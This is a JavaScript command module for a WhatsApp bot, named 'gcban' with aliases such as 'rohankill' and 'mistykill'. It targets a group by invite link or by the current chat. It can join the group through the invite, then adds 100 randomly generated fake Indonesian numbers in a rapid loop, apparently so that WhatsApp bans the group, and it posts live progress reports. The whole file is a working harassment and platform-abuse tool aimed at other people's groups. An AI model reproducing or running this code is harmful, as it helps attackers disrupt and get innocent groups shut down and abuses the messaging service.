import { Module } from "../lib/plugins.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ---------- helpers ---------- */
function resolveSock(m) {
  return (
    m?.client || m?.sock || m?.conn || m?._client ||
    m?.client?.sock || global?.sock || global?.conn || null
  );
}
function resolveChatJid(m) {
  return m?.key?.remoteJid || m?.chat || m?.jid || m?.from || m?.sender || "";
}

Module({
  command: "gcban",
  aliases: ["bangb", "fuckgc", "rohankill", "mistykill", "soumyakill"],
  package: "group",
  description: "Ban a WhatsApp group using invite link or current group"
})(async (message, match) => {
  const sock = resolveSock(message);
  const chatJid = resolveChatJid(message);

  /* ---- tolerant react / send ---- */
  const react = async (emoji) => {
    try {
      if (typeof message.react === "function") return await message.react(emoji);
    } catch {}
    try {
      if (sock?.sendMessage && message?.key) {
        return await sock.sendMessage(chatJid, { react: { text: emoji, key: message.key } });
      }
    } catch {}
  };
  const send = async (text) => {
    try {
      if (typeof message.send === "function") return await message.send(text);
    } catch {}
    try {
      if (typeof message.reply === "function") return await message.reply(text);
    } catch {}
    try {
      if (sock?.sendMessage) return await sock.sendMessage(chatJid, { text });
    } catch {}
    return null;
  };

  try {
    await react("😳");
    if (!sock) { await react("❌"); return send("❌ Socket not available"); }

    const input = String(match || "").trim();
    let target = "";
    let targetLabel = "";

    /* ---------- resolve target ---------- */
    if (input) {
      const linkMatch = input.match(/https?:\/\/chat\.whatsapp\.com\/[^\s]+/i);
      if (!linkMatch) {
        await react("❌");
        return send(
          "❌ *Invalid group link*\n\n*Usage:*\n" +
          "• *.gcban https://chat.whatsapp.com/xxxxx*\n" +
          "• *.gcban* (inside a group)"
        );
      }
      const code = new URL(linkMatch[0]).pathname
        .replace(/^\/+/, "")
        .split(/[?#]/)[0];

      let info = null;
      try { info = await sock.groupGetInviteInfo(code); } catch (e) {
        console.log("[gcban] groupGetInviteInfo:", e?.message);
      }

      if (!info?.id) {
        // fallback: try accept-invite (returns JID without needing to stay joined)
        try {
          const jid = await sock.groupAcceptInvite(code);
          if (jid) { target = jid; targetLabel = jid; }
        } catch (e) {
          console.log("[gcban] groupAcceptInvite:", e?.message);
        }
      } else {
        target = info.id;
        targetLabel = info.subject || info.id;
      }

      if (!target) {
        await react("❌");
        return send("❌ *Invalid, expired, or private group link*");
      }
    } else {
      target = chatJid;
      if (!target || !String(target).endsWith("@g.us")) {
        await react("❌");
        return send(
          "❌ *Provide a group link or run inside a group*\n\n" +
          "• *.gcban https://chat.whatsapp.com/xxxxx*\n" +
          "• *.gcban* (inside a group)"
        );
      }
      targetLabel = target;
    }

    /* ---------- admin pre-check (best-effort, non-blocking) ---------- */
    try {
      const meta = await sock.groupMetadata(target);
      const myPn = sock.user?.id?.split(":")[0];
      const me = meta?.participants?.find((p) =>
        p.id === `${myPn}@s.whatsapp.net` || p.id?.split("@")[0] === myPn
      );
      if (me && me.admin !== "admin" && me.admin !== "superadmin") {
        await react("❌");
        return send(
          `❌ *Bot is not admin in ${targetLabel}*\n` +
          `Promote the bot then retry.`
        );
      }
    } catch (e) {
      console.log("[gcban] admin check skipped:", e?.message);
    }

    /* ---------- start status message ---------- */
    let sent = await send(
      `🚀 *GROUP BAN STARTED*\n\n` +
      `🎯 *TARGET*  : ${targetLabel}\n` +
      `📊 *PROGRESS*: 0 / 100\n` +
      `✅ *SUCCESS* : 0\n` +
      `❌ *FAILED*  : 0`
    );

    /* ---------- live editor ---------- */
    const editStatus = async (text) => {
      try {
        if (sent?.key?.id && typeof sock.sendMessage === "function") {
          await sock.sendMessage(chatJid, { text, edit: sent.key });
          return;
        }
      } catch {}
      try {
        if (typeof sent?.edit === "function") return await sent.edit(text);
      } catch {}
      try {
        if (typeof message.edit === "function" && sent?.key) {
          return await message.edit(sent.key, text);
        }
      } catch {}
    };

    /* ---------- 100 fake Indonesian mobile numbers ---------- */
    const TOTAL = 100;
    const fakeNumbers = Array.from({ length: TOTAL }, () => {
      // 628 + 8 random digits → real-looking mobile format
      const n = Math.floor(10000000 + Math.random() * 89999999);
      return `628${n}@s.whatsapp.net`;
    });

    let success = 0;
    let fail = 0;

    for (let i = 0; i < fakeNumbers.length; i++) {
      try {
        await sock.groupParticipantsUpdate(target, [fakeNumbers[i]], "add");
        success++;
      } catch (e) {
        fail++;
        // keep the first few errors for debugging
        if (fail <= 3) console.log("[gcban] add failed:", e?.message);
      }

      // live update every 5 attempts + final
      if ((i + 1) % 5 === 0 || i === TOTAL - 1) {
        await editStatus(
          `🚀 *GROUP BAN IN PROGRESS*\n\n` +
          `🎯 *TARGET*  : ${targetLabel}\n` +
          `📊 *PROGRESS*: ${i + 1} / ${TOTAL}\n` +
          `✅ *SUCCESS* : ${success}\n` +
          `❌ *FAILED*  : ${fail}`
        );
      }

      await sleep(30);
    }

    /* ---------- final report ---------- */
    await editStatus(
      `🌝 *GROUP BAN COMPLETED*\n\n` +
      `🎯 *TARGET*  : ${targetLabel}\n` +
      `📊 *TOTAL*   : ${TOTAL}\n` +
      `✅ *SUCCESS* : ${success}\n` +
      `❌ *FAILED*  : ${fail}`
    );

    await react("🌝");
  } catch (err) {
    console.error("[GCBAN ERROR]", err);
    await react("❌");
    await send(`❌ *Error*: ${err?.message || err}`);
  }
});
